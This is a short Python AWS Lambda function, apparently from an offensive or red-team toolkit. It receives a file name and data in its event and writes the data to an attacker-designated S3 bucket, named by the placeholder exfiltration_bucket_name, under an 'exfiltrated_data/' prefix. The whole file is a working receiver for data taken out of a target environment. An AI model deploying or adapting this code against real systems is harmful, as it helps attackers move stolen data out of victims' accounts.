import json
import boto3

exfiltration_bucket_name = "<EXFILTRATION_BUCKET_NAME>" 

def lambda_handler(event, context):

    #Enviroment setup
    bucket_name = exfiltration_bucket_name
    file_name = event["fileName"] + ".txt"
    
    lambda_path = "/tmp/" + file_name
    s3_path = "exfiltrated_data/" + file_name

    string = event["data"]
    encoded_string = string.encode("utf-8")

    s3 = boto3.resource("s3")
    s3.Bucket(bucket_name).put_object(Key=s3_path, Body=encoded_string)
    
    return {
        'statusCode': 200,
        'body': 'Success!',
        'partUploaded': file_name
    }